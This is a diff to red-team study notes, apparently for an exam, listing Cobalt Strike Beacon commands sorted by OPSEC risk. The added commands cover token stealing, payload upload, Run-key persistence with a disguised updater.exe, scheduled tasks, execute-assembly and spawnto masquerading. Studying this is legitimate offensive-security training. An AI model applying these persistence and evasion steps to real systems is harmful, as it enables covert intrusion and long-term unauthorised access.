@@ -11,30 +11,46 @@ When you double-click a beacon in the CS console, the **Interact** tab opens.
 
 >[OPSEC Consideration for Beacon Commands](https://www.cobaltstrike.com/blog/opsec-considerations-for-beacon-commands)  
 
-## Situational Awareness — Commands
+## Beacon Commands - OPSEC SAFE ✅
 
 ```
-beacon> getuid                  # Who am I? (domain\user + integrity level)
-beacon> ps                      # Process list — look for EDR/AV, find steal_token targets
+getuid                      # Who am I? (domain\user + integrity level)
+ls                      # Directory listing (default: current dir)
+pwd                     # Current working directory
+env                     # Environment variables
+whoami /groups          # (via shell — OPSEC-UNSAFE, use carefully)
+process_browser
+steal_token 0000            # Impersonated User on current beacon host
+
+cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
+upload C:\Payloads\http_x64.exe
+
+reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run
+reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps\updater.exe
+
+powerpick Register-ScheduledTask
+powerpick Get-ScheduledTask
+execute-assembly Seatbelt.exe
+
+execute-assembly
+powerpick 
+spawnto x64 %windir%\sysnative\notepad.exe
+
+download C:\path\to\file.xxx
+
 beacon> net localgroup          # Local group memberships
 beacon> net computers           # Enumerate domain computers (via NetAPI)
 beacon> ipconfig                # Network config
 beacon> netstat                 # Active connections
-beacon> ls                      # Directory listing (default: current dir)
-beacon> pwd                     # Current working directory
-beacon> env                     # Environment variables
-beacon> whoami /groups          # (via shell — OPSEC-UNSAFE, use carefully)
 ```
 
----
-
-## Sleep / Jitter
+## Beacon Commands - OPSEC CAUTION💡
 
 ```
-beacon> sleep 60                # Sleep 60 seconds between checkins
-beacon> sleep 60 20             # Sleep 60s with 20% jitter (60 ± 12s)
-beacon> sleep 0                 # Interactive mode — NO sleep (noisy, avoid in exam)
+shell schtasks          # list current scheduled task on beacon host
+
 ```
+
 
 **OPSEC:** Keep sleep ≥ 30s in exam. Default profile sleep from `set sleeptime`.
 
